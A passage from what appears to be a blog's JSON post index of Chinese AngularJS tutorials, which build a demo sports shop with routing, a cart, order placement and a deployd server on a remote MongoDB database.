&lt;td&gt; &lt;button ng-click=\"startEdit(item)\" class=\"btn btn-xs btn-primary\"&gt; Edit &lt;/button&gt; &lt;button ng-click=\"deleteProduct(item)\" class=\"btn btn-xs btn-primary\"&gt; Delete &lt;/button&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr ng-class=\"&#123;danger: editedProduct&#125;\"&gt; &lt;td&gt;&lt;input ng-model=\"editedProduct.name\" required /&gt;&lt;/td&gt; &lt;td&gt;&lt;input ng-model=\"editedProduct.description\" required /&gt;&lt;/td&gt; &lt;td&gt;&lt;input ng-model=\"editedProduct.category\" required /&gt;&lt;/td&gt; &lt;td&gt;&lt;input ng-model=\"editedProduct.price\" required /&gt;&lt;/td&gt; &lt;td&gt; &lt;button ng-hide=\"editedProduct.id\" ng-click=\"createProduct(editedProduct)\" class=\"btn btn-xs btn-primary\"&gt; Create &lt;/button&gt; &lt;button ng-show=\"editedProduct.id\" ng-click=\"updateProduct(editedProduct)\" class=\"btn btn-xs btn-primary\"&gt; Save &lt;/button&gt; &lt;button ng-show=\"editedProduct\" ng-click=\"cancelEdit()\" class=\"btn btn-xs btn-primary\"&gt; Cancel &lt;/button&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/table&gt;&lt;/div&gt; 产品管理控制器1234567891011121314151617181920212223242526272829303132333435363738394041424344454647angular.module(\"sportsStoreAdmin\").constant(\"productUrl\", \"/products/\").config(function($httpProvider) &#123; // 此处通过调用模块的config方法改变所有ajax请求的默认设置 // 并且声明$httpProvider依赖 $httpProvider.defaults.withCredentials = true;&#125;).controller(\"productCtrl\", function ($scope, $resource, productUrl) &#123; // 本控制器最关键处：创建提供权限访问RESTful API的访问对象，即productsResource // $resource方法的第一个参数定义了URL格式，其中:id与第二个参数映射 // 即：若数据对象中有id属性，则将其添加到请求url中 // 返回的productsResource对象有CRUD的各种方法，用于操作服务器数据 $scope.productsResource = $resource(productUrl + \":id\", &#123; id: \"@id\" &#125;); // 获取所有产品方法 $scope.listProducts = function () &#123; $scope.products = $scope.productsResource.query(); &#125; $scope.deleteProduct = function (product) &#123; product.$delete().then(function () &#123; $scope.products.splice($scope.products.indexOf(product), 1); &#125;); &#125; $scope.createProduct = function (product) &#123; new $scope.productsResource(product).$save().then(function (newProduct) &#123; $scope.products.push(newProduct); $scope.editedProduct = null; &#125;); &#125; $scope.updateProduct = function (product) &#123; product.$save(); $scope.editedProduct = null; &#125; $scope.startEdit = function (product) &#123; $scope.editedProduct = product; &#125; $scope.cancelEdit = function () &#123; $scope.editedProduct = null; &#125; // 每次进入该控制器（即切换到控制器所在的视图时）立即调用获取所有产品 $scope.listProducts();&#125;); 博客源码地址","categories":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/categories/angularjs/"}],"tags":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/tags/angularjs/"},{"name":"deployd","slug":"deployd","permalink":"https://github.com/xmoyKING/tags/deployd/"}]},{"title":"angularjs入门笔记-10-使用deployd作为服务器，增加订单功能","slug":"angularjs10","date":"2017-05-11T09:45:58.000Z","updated":"2017-05-11T09:45:58.000Z","comments":true,"path":"2017/05/11/angularjs10/","link":"","permalink":"https://github.com/xmoyKING/2017/05/11/angularjs10/","excerpt":"","text":"本次使用deployd作为服务器，同时使用远程mongodb数据库，而不再是connect-static静态服务了，同时添加订单功能。 关于deployd的安装和环境问题，参考上一篇博客。 完成后的界面： 目录组织结构：123456789101112131415161718192021222324252627282930313233343536angularjs #项目目录 .dpd #deployd的一些信息 pids keys.json #保存dpd keygen命令生成的key data public #deployd项目生成的静态文件目录 components #组件文件夹 cart #购物车组件 cart.js #购物车模块 cartSummary.html #购物车视图代码 controllers #控制器文件夹+ sportsStore.js #全局模块-公用控制器 productListController.js #仅仅只用于展示产品的控制器 checkoutControllers.js #检查购物车模块 filters #过滤器文件夹 customFilters.js #在该文件中定义所有的过滤器 ngmodules #存放ng的插件 angular-route.js #路由插件 views #存放视图 checkoutSummary.html #计算总价视图 productList.html #展示产品列表 placeOrder.html #订单运送地址收集 thankYou.html #完成订单展示页面，通知用户订单号 angular.js #文件 bootstrap-theme.css bootstrap.css app.html #静态应用入口文件 resources #此目录保存deployd dashboard中创建的表的结构（严格来说不是表而是collection） orders #order表 config.json #order表结构（字段类型） products config.json app.dpd server.js #启动deployd服务器脚本node_modules #node包目录package.json #项目信息，包括启动服务器脚本 先用npm init初始化一个空目录，然后在目录内使用dpd create angularjs生成一个dpd项目，然后将server.js文件放入该目录下，作为启动dpd服务器的脚本。 1234567891011121314151617181920212223242526272829// server.jsvar deployd = require('deployd');var server = deployd(&#123; port: process.env.PORT || 5000, env: 'demo', db: &#123; host: '远程mongodb域名或ip', port: 端口, name: '数据库名', credentials: &#123; username: '用户名', password: '密码' &#125; &#125;&#125;);server.listen();server.on('listening', function() &#123; console.log(\"Demo Server in 5000\");&#125;);server.on('error', function(err) &#123; console.error(err); process.nextTick(function() &#123; // Give the server a chance to return an error process.exit(); &#125;);&#125;); 然后在生成的angularjs目录下找到public,其内会有一个index.html作为默认首页，但本项目不需要使用此页面，直接将以前写好的angularjs项目放入public目录即可。 由于添加了订单功能（即收集用户地址，完善订单功能），所以我们需要一个新的视图，即placeOrder.html文件内容:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192&lt;!-- 其实仅是一个form表单采集地址信息 --&gt;&lt;style&gt; /* 为ng默认的验证class添加样式 */ .ng-invalid &#123; background-color: lightpink; &#125; .ng-valid &#123; background-color: lightgreen; &#125; span.error &#123; color: red; font-weight: bold; &#125;&lt;/style&gt;&lt;h2&gt;Check out now&lt;/h2&gt;&lt;p&gt;Please enter your details, and we'll ship your goods right away!&lt;/p&gt;&lt;!-- 使用novalidate属性关闭浏览器的自带H5表单验证 --&gt;&lt;form name=\"shippingForm\" novalidate&gt; &lt;div class=\"well\"&gt; &lt;h3&gt;Ship to&lt;/h3&gt; &lt;div class=\"form-group\"&gt; &lt;label&gt;Name&lt;/label&gt; &lt;input name=\"name\" class=\"form-control\" ng-model=\"data.shipping.name\" required /&gt; &lt;!-- 通过在name属性上绑定$error以及对应的required属性，然后通过ng-show命令自动的显示/隐藏错误信息 --&gt; &lt;span class=\"error\" ng-show=\"shippingForm.name.$error.required\"&gt; Please enter a name &lt;/span&gt; &lt;/div&gt; &lt;h3&gt;Address&lt;/h3&gt; &lt;div class=\"form-group\"&gt; &lt;label&gt;Street Address&lt;/label&gt; &lt;input name=\"street\" class=\"form-control\" ng-model=\"data.shipping.street\" required /&gt; &lt;span class=\"error\" ng-show=\"shippingForm.street.$error.required\"&gt; Please enter a street address &lt;/span&gt; &lt;/div&gt; &lt;div class=\"form-group\"&gt; &lt;label&gt;City&lt;/label&gt; &lt;input name=\"city\" class=\"form-control\" ng-model=\"data.shipping.city\" required /&gt; &lt;span class=\"error\" ng-show=\"shippingForm.city.$error.required\"&gt; Please enter a city &lt;/span&gt; &lt;/div&gt; &lt;div class=\"form-group\"&gt; &lt;label&gt;State&lt;/label&gt; &lt;input name=\"state\" class=\"form-control\" ng-model=\"data.shipping.state\" required /&gt; &lt;span class=\"error\" ng-show=\"shippingForm.state.$error.required\"&gt; Please enter a state &lt;/span&gt; &lt;/div&gt; &lt;div class=\"form-group\"&gt; &lt;label&gt;Zip&lt;/label&gt; &lt;input name=\"zip\" class=\"form-control\" ng-model=\"data.shipping.zip\" required /&gt; &lt;span class=\"error\" ng-show=\"shippingForm.zip.$error.required\"&gt; Please enter a zip code &lt;/span&gt; &lt;/div&gt; &lt;div class=\"form-group\"&gt; &lt;label&gt;Country&lt;/label&gt; &lt;input name=\"country\" class=\"form-control\" ng-model=\"data.shipping.country\" required /&gt; &lt;span class=\"error\" ng-show=\"shippingForm.country.$error.required\"&gt; Please enter a country &lt;/span&gt; &lt;/div&gt; &lt;h3&gt;Options&lt;/h3&gt; &lt;div class=\"checkbox\"&gt; &lt;label&gt; &lt;input name=\"giftwrap\" type=\"checkbox\" ng-model=\"data.shipping.giftwrap\" /&gt; Gift wrap these items &lt;/label&gt; &lt;/div&gt; &lt;div class=\"text-center\"&gt; &lt;!-- 绑定完成订单按钮，将所有表单内绑定的数据发送到后台 --&gt; &lt;button ng-disabled=\"shippingForm.$invalid\" ng-click=\"sendOrder(data.shipping)\" class=\"btn btn-primary\"&gt; Complete order &lt;/button&gt; &lt;/div&gt; &lt;/div&gt;&lt;/form&gt; thankYou.html文件内容如下，即通知用户订单号，若下单失败显示错误信息：12345678910&lt;div class=\"alert alert-danger\" ng-show=\"data.orderError\"&gt; Error (&#123;&#123;data.orderError.status&#125;&#125;). The order could not be placed. &lt;a href=\"#/placeorder\" class=\"alert-link\"&gt;Click here to try again&lt;/a&gt;&lt;/div&gt;&lt;div class=\"well\" ng-hide=\"data.orderError\"&gt; &lt;h2&gt;Thanks!&lt;/h2&gt; Thanks for placing your order. We'll ship your goods as soon as possible. If you need to contact us, use reference &#123;&#123;data.orderId&#125;&#125;.&lt;/div&gt; 然后将package.json中的scripts中的start项修改如下：1234\"scripts\": &#123; \"test\": \"echo \\\"Error: no test specified\\\" &amp;&amp; exit 1\", \"start\": \"cd angularjs &amp;&amp; node server.js\"&#125; 此时就可以在项目中使用npm start启动应用了，访问localhost:5000/app.html即可看到熟悉的sports store的界面了，但是由于没有配置接口路径无法获取服务器的数据，此时我们访问localhost:5000/dashboard，然后填入dpd 生成的key就可以访问dpd为什么生成的数据库操作界面了。 然后依次添加两个表，分别是orders和products表，具体字段和预设内容（手动录入一些测试数据）如下： 其实dpd在我们生成表的时候，已经将关于表的CRUD的接口为我们写好了，通过dashboard中表中的API菜单即可看到，比如products表的接口如下： 可以测试/products接口，发现dpd服务器自动为我们返回了json格式的products数据。 由于本次server.js中使用的端口默认为5000（也可在执行server.js时指定其他端口），所以需要将sportsStore.js文件中的dataUrl 和 orderUrl修改为对应的接口地址，同时:12345678910111213141516171819202122232425262728293031angular.module(\"sportsStore\") .constant(\"dataUrl\", \"/products\") // 修改接口地址，使用dpd提供的接口 .constant(\"orderUrl\", \"/orders\") .controller(\"sportsStoreCtrl\", function($scope, $http, $location, dataUrl, orderUrl, cart) &#123; $scope.data = &#123;&#125;; $http.get(dataUrl) .success(function(data) &#123; $scope.data.products = data; &#125;) .error(function(error) &#123; $scope.data.error = error; &#125;); // 同时我们添加了发送订单功能，即将购物车内的物品 $scope.sendOrder = function(shippingDetails) &#123; var order = angular.copy(shippingDetails); order.products = cart.getProducts(); $http.post(orderUrl, order) .success(function(data) &#123; //成功下单后获取服务器响应的数据 $scope.data.orderId = data.id; // 将响应中的id设置到全局作用域的订单id cart.getProducts().length = 0; // 然后清空购物车 &#125;) .error(function(error) &#123; $scope.data.orderError = error; &#125;).finally(function() &#123; $location.path(\"/complete\"); // 最后使用ng的$location而不是js原生的location将路径跳转到完成视图 &#125;); &#125; &#125;); 然后刷新app.html页面，就可以看到本博客上最开始的那张界面了。 依次点击商品加入购物车，然后点击Place Order按钮，然后填写地址信息，完成订单即可，最后会显示订单编号。 然后可以在dashboard查看订单，显示的订单号即为刚刚完成的订单 博客源码地址","categories":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/categories/angularjs/"}],"tags":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/tags/angularjs/"},{"name":"deployd","slug":"deployd","permalink":"https://github.com/xmoyKING/tags/deployd/"}]},{"title":"deployd入门安装","slug":"deployd","date":"2017-05-11T06:37:44.000Z","updated":"2017-05-11T06:37:44.000Z","comments":true,"path":"2017/05/11/deployd/","link":"","permalink":"https://github.com/xmoyKING/2017/05/11/deployd/","excerpt":"","text":"在ubuntu下使用deployd搭建一个开发测试环境，数据库使用服务器端。 可将deployd安装到任何地方，使用官方的脚本启动本地的deployd服务即可。 由于deployd是node的一个包，而且依赖mongodb数据库，所以需要有这两者的环境。同时，若想要将应用常驻服务器中（作为ubuntu中的一个守护进程）则可以使用node的forever启动应用。 参考:HOW TO SETUP DEPLOYD ON UBUNTU SERVER 关于mongodb的一些坑安装mongodb时，直接使用sudo apt-get install mongodb-server 在mongodb添加用户的时候，发现addUser已经废弃了，使用createUser代替 若要开启服务器上的mongod作为常驻服务，需要配置bind_ip，将bind_ip配置为0.0.0.0，表示接受任何IP的连接。 mongodb的配置文件中的bind_ip 默认为127.0.0.1，默认只有本机可以连接。 配置完成后需要重新启动mongod， 然后就可以使用Robomongo远程链接了 【Linux】启动mongo db后台服务 MongoDb的bin目录下文件mongod,mongo,mongostat命令的说明及使用 若不想自己搭建mongodb的测试服务器，也可以使用mlab中的免费服务器。 deployd当使用远程的mongodb时，就无法直接使用dpd开启服务了，此时可以使用node脚本开启服务并且可以指定远程mongodb数据库. 1234567891011121314151617181920212223242526272829// server.jsvar deployd = require('deployd');var server = deployd(&#123; port: process.env.PORT || 5000, env: 'demo', db: &#123; host: '远程mongodb域名或ip', port: '数据库端口', name: '数据库名', credentials: &#123; username: '数据库用户名', password: '数据库密码' &#125; &#125;&#125;);server.listen();server.on('listening', function() &#123; console.log(\"Demo Server in 5000\");&#125;);server.on('error', function(err) &#123; console.error(err); process.nextTick(function() &#123; // Give the server a chance to return an error process.exit(); &#125;);&#125;); 注意，运行此脚本时的命令文件夹下必须存在resource命令（即不是指此脚本的位置，而是指运行此脚本时的位置）如下目录：12345678910/Demo /dpdDir /.dpd /data /public /resources app.dpd server.js /node_moudules package.json 当在Demo目录下使用命令cd dpdDir，然后运行node server.js没问题。但当直接使用命令node ./dpdDir/server.js就会报找不到resources文件夹 所以若直接在package.json中使用scripts开启服务，则需要使用命令123\"scripts\": &#123; \"start\": \"cd dpdDir &amp;&amp; node server.js\"&#125;, 然后，当进入dashboard的时候会需要一个key，此时在项目目录下（dpdDir）使用dpd keygen即可生成key，此命令会在dpdDir/.dpd/keys.json中生成一个对象，打开文件即可找到这个key，其内的一串英文。使用show key也可以得到这个生成的key，但是可能会被自动换行，所以复制keys.json里的字符串即可。","categories":[{"name":"Nodejs","slug":"Nodejs","permalink":"https://github.com/xmoyKING/categories/Nodejs/"}],"tags":[{"name":"deployd","slug":"deployd","permalink":"https://github.com/xmoyKING/tags/deployd/"},{"name":"node","slug":"node","permalink":"https://github.com/xmoyKING/tags/node/"},{"name":"mongodb","slug":"mongodb","permalink":"https://github.com/xmoyKING/tags/mongodb/"}]},{"title":"angularjs入门笔记-9-购物网站-添加购物车和路由功能","slug":"angularjs9","date":"2017-05-08T06:09:25.000Z","updated":"2017-05-08T06:09:25.000Z","comments":true,"path":"2017/05/08/angularjs9/","link":"","permalink":"https://github.com/xmoyKING/2017/05/08/angularjs9/","excerpt":"","text":"一个网站不可能只在一个html文件就完成了的，一般都有多个html文件以及多个不同的组件或者模块，这就需要后端定义路由（即url地址）与组件代码片段，而angularjs有一个路由的插件可以将路由功能放在前端完成，同时提供了组件功能，在上一个篇的基础上，本次加上路由功能和购物车。 接上一篇：angularjs入门笔记-8-静态购物网站产品列表Demo 有添加到购物车功能后的产品列表界面效果如下图: 购物车界面如下图： 目录组织结构：1234567891011121314151617181920212223angularjs #项目目录 components #组件文件夹 cart #购物车组件 cart.js #购物车模块 cartSummary.html #购物车视图代码 controllers #控制器文件夹+ sportsStore.js #全局模块-公用控制器 productListController.js #仅仅只用于展示产品的控制器 checkoutControllers.js #检查购物车模块 filters #过滤器文件夹 customFilters.js #在该文件中定义所有的过滤器 ngmodules #存放ng的插件 angular-route.js views #存放视图 checkoutSummary.html productList.html angular.js #文件 bootstrap-theme.css bootstrap.css app.html #静态应用入口文件 products.json #模拟从服务获取的json数据node_modules #node包目录server.js #启动静态服务器的入口文件 应用入口app.html随着应用的功能增加，逻辑变的复杂许多，html元素更是错综复杂，没办法一下弄清楚每个元素完成的功能，此时需要将这些标签拆分，使用ng-include指令在运行时引入这些局部视图。 使用局部视图有如下好处： 将应用拆分为可独立管理的块 在应用范围内的可复用性 易于与不同的路由url结合，修改对应的视图 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;!DOCTYPE html&gt;&lt;html ng-app=\"sportsStore\"&gt;&lt;head&gt; &lt;title&gt;SportsStore&lt;/title&gt; &lt;script src=\"angular.js\"&gt;&lt;/script&gt; &lt;link href=\"bootstrap.css\" rel=\"stylesheet\" /&gt; &lt;link href=\"bootstrap-theme.css\" rel=\"stylesheet\" /&gt; &lt;script&gt; angular.module(\"sportsStore\", [\"customFilters\", \"cart\", \"ngRoute\"]) // 调用模块上的config对象设置路由，在模块被载入而应用还未执行前调用（即完成配置及初始化应用的功能） .config(function ($routeProvider) &#123; // 此处的$routeProvider是$route服务的服务提供器（所谓的\"服务提供器\"简单认为暴露的接口即可） // 定义每个路由路径对应的局部视图 $routeProvider.when(\"/complete\", &#123; templateUrl: \"/views/thankYou.html\" &#125;); $routeProvider.when(\"/placeorder\", &#123; templateUrl: \"/views/placeOrder.html\" &#125;); $routeProvider.when(\"/checkout\", &#123; templateUrl: \"/views/checkoutSummary.html\" &#125;); $routeProvider.when(\"/products\", &#123; templateUrl: \"/views/productList.html\" &#125;); // 定义其他情况下的路由视图（包括默认不输入任何路径的情况下） $routeProvider.otherwise(&#123; templateUrl: \"/views/productList.html\" &#125;); &#125;); &lt;/script&gt; &lt;script src=\"controllers/sportsStore.js\"&gt;&lt;/script&gt; &lt;script src=\"filters/customFilters.js\"&gt;&lt;/script&gt; &lt;script src=\"controllers/productListControllers.js\"&gt;&lt;/script&gt; &lt;script src=\"components/cart/cart.js\"&gt;&lt;/script&gt; &lt;script src=\"ngmodules/angular-route.js\"&gt;&lt;/script&gt; &lt;script src=\"controllers/checkoutControllers.js\"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body ng-controller=\"sportsStoreCtrl\"&gt; &lt;div class=\"navbar navbar-inverse\"&gt; &lt;a class=\"navbar-brand\" href=\"#\"&gt;SPORTS STORE&lt;/a&gt; &lt;cart-summary /&gt; &lt;!-- 自定义指令cart-summary --&gt; &lt;/div&gt; &lt;!-- 错误提示框，当出现错误时显示错误信息 --&gt; &lt;div class=\"alert alert-danger\" ng-show=\"data.error\"&gt; Error (&#123;&#123;data.error.status&#125;&#125;). The product data was not loaded. &lt;a href=\"/app.html\" class=\"alert-link\"&gt;Click here to try again&lt;/a&gt; &lt;/div&gt; &lt;ng-view /&gt; &lt;!-- 加载局部视图的指令，此指令是在ngRoute模块中定义的 --&gt;&lt;/body&gt;&lt;/html&gt; 全局模块-公用控制器 sportsStore.js将模型修改为通过后端服务器获取1234567891011121314angular.module(\"sportsStore\") .constant(\"dataUrl\", \"products.json\") // 定义常量，此处的products.json可以改为某个url接口 .controller(\"sportsStoreCtrl\", function ($scope, $http, dataUrl) &#123; $scope.data = &#123;&#125;; // 使用http服务将模型加载到应用内 $http.get(dataUrl) .success(function (data) &#123; $scope.data.products = data; &#125;) .error(function (error) &#123; // 当加载数据出错时显示提示信息 $scope.data.error = error; &#125;); &#125;); products.json此json数据多了一个id字段标识每一种产品，当加入购物车时以id字段作为标识12345678910111213141516171819202122232425262728[&#123; \"id\": \"ID1\", \"name\": \"Product #1\", \"description\": \"A product\", \"category\": \"Category #1\", \"price\": 100&#125;,&#123; \"id\": \"ID2\", \"name\": \"Product #2\", \"description\": \"A product\", \"category\": \"Category #1\", \"price\": 110&#125;,&#123; \"id\": \"ID3\", \"name\": \"Product #3\", \"description\": \"A product\", \"category\": \"Category #2\", \"price\": 210&#125;,&#123; \"id\": \"ID4\", \"name\": \"Product #4\", \"description\": \"A product\", \"category\": \"Category #3\", \"price\": 202&#125;] 产品列表视图 productList.html将产品列表部分从app.html中抽离出，123456789101112131415161718192021222324252627282930313233343536&lt;div class=\"panel panel-default row\" ng-controller=\"productListCtrl\" ng-hide=\"data.error\"&gt; &lt;div class=\"col-xs-3\"&gt; &lt;a ng-click=\"selectCategory()\" class=\"btn btn-block btn-default btn-lg\"&gt;Home&lt;/a&gt; &lt;a ng-repeat=\"item in data.products | orderBy:'category' | unique:'category'\" ng-click=\"selectCategory(item)\" class=\" btn btn-block btn-default btn-lg\" ng-class=\"getCategoryClass(item)\"&gt; &#123;&#123;item&#125;&#125; &lt;/a&gt; &lt;/div&gt; &lt;div class=\"col-xs-8\"&gt; &lt;div class=\"well\" ng-repeat=\"item in data.products | filter:categoryFilterFn | range:selectedPage:pageSize\"&gt; &lt;h3&gt; &lt;strong&gt;&#123;&#123;item.name&#125;&#125;&lt;/strong&gt; &lt;span class=\"pull-right label label-primary\"&gt; &#123;&#123;item.price | currency&#125;&#125; &lt;/span&gt; &lt;/h3&gt; &lt;!-- 添加产品到购物车按钮 --&gt; &lt;button ng-click=\"addProductToCart(item)\" class=\"btn btn-success pull-right\"&gt; Add to cart &lt;/button&gt; &lt;span class=\"lead\"&gt;&#123;&#123;item.description&#125;&#125;&lt;/span&gt; &lt;/div&gt; &lt;div class=\"pull-right btn-group\"&gt; &lt;a ng-repeat=\"page in data.products | filter:categoryFilterFn | pageCount:pageSize\" ng-click=\"selectPage($index + 1)\" class=\"btn btn-default\" ng-class=\"getPageClass($index + 1)\"&gt; &#123;&#123;$index + 1&#125;&#125; &lt;/a&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt; 购物车模块/服务 cart.js比如购物车这样独立的功能可以将其放在组件文件夹内，而不是将其控制器和视图放在公共区域，在新模块cart中自定义服务，使用factory方法，传入服务的名称和函数，工厂模式将在该服务需要时被调用（而不是应用一开始就被调用），通过这个工厂函数只调用一次。12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364angular.module(\"cart\", []).factory(\"cart\", function () &#123; var cartData = []; return &#123; // 添加指定的产品到购物车，若购物车已包含该产品，则增加数量 addProduct: function (id, name, price) &#123; var addedToExistingItem = false; for (var i = 0; i &lt; cartData.length; i++) &#123; if (cartData[i].id == id) &#123; cartData[i].count++; addedToExistingItem = true; break; &#125; &#125; if (!addedToExistingItem) &#123; cartData.push(&#123; count: 1, id: id, price: price, name: name &#125;); &#125; &#125;, // 删除指定的产品 removeProduct: function (id) &#123; for (var i = 0; i &lt; cartData.length; i++) &#123; if (cartData[i].id == id) &#123; cartData.splice(i, 1); break; &#125; &#125; &#125;, // 返回购物车中所有产品 getProducts: function () &#123; return cartData; &#125; &#125;&#125;)// 创建一个购物车结算指令，该指令能在多个页面中复用.directive(\"cartSummary\", function (cart) &#123; // 自定义指令需要传入两个参数，一个为指令名称，一个为指令执行时调用的工厂函数 return &#123; // 返回一个对象，该对象定义了指令的各种属性 restrict: \"E\", // 以元素标签的形式调用该指令（可简单的当做是自定义的html标签即可） templateUrl: \"components/cart/cartSummary.html\", // 指定指令的局部视图，即完成后的html元素内容 controller: function ($scope) &#123; // 指定该指令的局部控制器 var cartData = cart.getProducts(); // 计算总价 $scope.total = function () &#123; var total = 0; for (var i = 0; i &lt; cartData.length; i++) &#123; total += (cartData[i].price * cartData[i].count); &#125; return total; &#125; // 计算产品的总量 $scope.itemCount = function () &#123; var total = 0; for (var i = 0; i &lt; cartData.length; i++) &#123; total += cartData[i].count; &#125; return total; &#125; &#125; &#125;;&#125;); 购物车统计总价和总量视图 cartSummary.html12345678910111213&lt;style&gt; .navbar-right &#123; float: right !important; margin-right: 5px; &#125; .navbar-text &#123; margin-right: 10px; &#125;&lt;/style&gt;&lt;div class=\"navbar-right\"&gt; &lt;div class=\"navbar-text\"&gt; &lt;b&gt;Your cart:&lt;/b&gt; &#123;&#123;itemCount()&#125;&#125; item(s), &#123;&#123;total() | currency&#125;&#125; &lt;/div&gt; &lt;a href=\"#/checkout\" class=\"btn btn-default navbar-btn\"&gt;Checkout&lt;/a&gt;&lt;/div&gt; 购物车控制器 checkoutControllers.js1234567891011121314151617angular.module(\"sportsStore\").controller(\"cartSummaryController\", function ($scope, cart) &#123; // 从自定义cart服务中获取已加入购物车的产品 $scope.cartData = cart.getProducts(); // 计算总价 $scope.total = function () &#123; var total = 0; for (var i = 0; i &lt; $scope.cartData.length; i++) &#123; total += ($scope.cartData[i].price * $scope.cartData[i].count); &#125; return total; &#125; // 从购物车中移除指定id的产品 $scope.remove = function (id) &#123; cart.removeProduct(id); &#125;&#125;); 购物车视图 checkoutSummary.html12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;h2&gt;Your cart&lt;/h2&gt;&lt;div ng-controller=\"cartSummaryController\"&gt; &lt;div class=\"alert alert-warning\" ng-show=\"cartData.length == 0\"&gt; There are no products in your shopping cart. &lt;a href=\"#/products\" class=\"alert-link\"&gt;Click here to return to the catalogue&lt;/a&gt; &lt;/div&gt; &lt;div ng-hide=\"cartData.length == 0\"&gt; &lt;table class=\"table\"&gt; &lt;thead&gt; &lt;tr&gt; &lt;th&gt;Quantity&lt;/th&gt; &lt;th&gt;Item&lt;/th&gt; &lt;th class=\"text-right\"&gt;Price&lt;/th&gt; &lt;th class=\"text-right\"&gt;Subtotal&lt;/th&gt; &lt;/tr&gt; &lt;/thead&gt; &lt;tbody&gt; &lt;tr ng-repeat=\"item in cartData\"&gt; &lt;td class=\"text-center\"&gt;&#123;&#123;item.count&#125;&#125;&lt;/td&gt; &lt;td class=\"text-left\"&gt;&#123;&#123;item.name&#125;&#125;&lt;/td&gt; &lt;td class=\"text-right\"&gt;&#123;&#123;item.price | currency&#125;&#125;&lt;/td&gt; &lt;td class=\"text-right\"&gt;&#123;&#123; (item.price * item.count) | currency&#125;&#125;&lt;/td&gt; &lt;td&gt; &lt;button ng-click=\"remove(item.id)\" class=\"btn btn-sm btn-warning\"&gt; Remove &lt;/button&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/tbody&gt; &lt;tfoot&gt; &lt;tr&gt; &lt;td colspan=\"3\" class=\"text-right\"&gt;Total:&lt;/td&gt; &lt;td class=\"text-right\"&gt; &#123;&#123;total() | currency&#125;&#125; &lt;/td&gt; &lt;/tr&gt; &lt;/tfoot&gt; &lt;/table&gt; &lt;div class=\"text-center\"&gt; &lt;a class=\"btn btn-primary\" href=\"#/products\"&gt;Continue shopping&lt;/a&gt; &lt;a class=\"btn btn-primary\" href=\"#/placeorder\"&gt;Place order now&lt;/a&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt; 博客源码地址","categories":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/categories/angularjs/"}],"tags":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/tags/angularjs/"}]},{"title":"angularjs入门笔记-8-购物网站产品列表Demo","slug":"angularjs8","date":"2017-05-05T02:56:41.000Z","updated":"2017-05-05T02:56:41.000Z","comments":true,"path":"2017/05/05/angularjs8/","link":"","permalink":"https://github.com/xmoyKING/2017/05/05/angularjs8/","excerpt":"","text":"延续上次学习的静态demo，angularjs6，本次做一个简单的实现分页，可分类展示产品的购物小demo 产品列表界面效果如下图: 目录组织结构：123456789101112angularjs #项目目录 controllers #控制器文件夹 sportsStore.js #全局模块-公用控制器 productListController.js #仅仅只用于展示产品的控制器 filters #过滤器文件夹 customFilters.js #在该文件中定义所有的过滤器 angular.js #文件 bootstrap-theme.css bootstrap.css app.html #静态html文件node_modules #node包目录server.js #启动静态服务器的入口文件 静态html文件app.html123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;!DOCTYPE html&gt;&lt;html ng-app=\"sportsStore\"&gt; &lt;!-- 绑定模块 --&gt;&lt;head&gt; &lt;title&gt;SportsStore&lt;/title&gt; &lt;script src=\"angular.js\"&gt;&lt;/script&gt; &lt;link href=\"bootstrap.css\" rel=\"stylesheet\" /&gt; &lt;link href=\"bootstrap-theme.css\" rel=\"stylesheet\" /&gt; &lt;script&gt; angular.module(\"sportsStore\", [\"customFilters\"]); // 初始化模块，并指定依赖，此处的依赖为声明，并不需要该依赖已经存在 &lt;/script&gt; &lt;script src=\"controllers/sportsStore.js\"&gt;&lt;/script&gt; &lt;script src=\"filters/customFilters.js\"&gt;&lt;/script&gt; &lt;script src=\"controllers/productListControllers.js\"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body ng-controller=\"sportsStoreCtrl\"&gt; &lt;!-- 全局控制器 --&gt; &lt;div class=\"navbar navbar-inverse\"&gt; &lt;a class=\"navbar-brand\" href=\"#\"&gt;SPORTS STORE&lt;/a&gt; &lt;/div&gt; &lt;div class=\"panel panel-default row\" ng-controller=\"productListCtrl\"&gt; &lt;!-- 产品列表控制器，继承全局控制器的作用域 --&gt; &lt;!-- 分类列表 --&gt; &lt;div class=\"col-xs-3\"&gt; &lt;a ng-click=\"selectCategory()\" class=\"btn btn-block btn-default btn-lg\"&gt;Home&lt;/a&gt; &lt;!-- 绑定函数，切换分类 --&gt; &lt;!-- 迭代每一个唯一的分类，同时在其上绑定点击事件 --&gt; &lt;a ng-repeat=\"item in data.products | orderBy:'category' | unique:'category'\" ng-click=\"selectCategory(item)\" class=\" btn btn-block btn-default btn-lg\" ng-class=\"getCategoryClass(item)\"&gt; &#123;&#123;item&#125;&#125; &lt;/a&gt; &lt;/div&gt; &lt;!-- 产品列表 --&gt; &lt;div class=\"col-xs-8\"&gt; &lt;!-- 使用过滤器，将所有产品中的对应分类以及当前的页数的产品过滤出来，然后用repeat迭代 --&gt; &lt;div class=\"well\" ng-repeat=\"item in data.products | filter:categoryFilterFn | range:selectedPage:pageSize\"&gt; &lt;h3&gt; &lt;strong&gt;&#123;&#123;item.name&#125;&#125;&lt;/strong&gt; &lt;span class=\"pull-right label label-primary\"&gt; &#123;&#123;item.price | currency&#125;&#125; &lt;/span&gt; &lt;/h3&gt; &lt;span class=\"lead\"&gt;&#123;&#123;item.description&#125;&#125;&lt;/span&gt; &lt;/div&gt; &lt;!-- 分页页码 --&gt; &lt;div 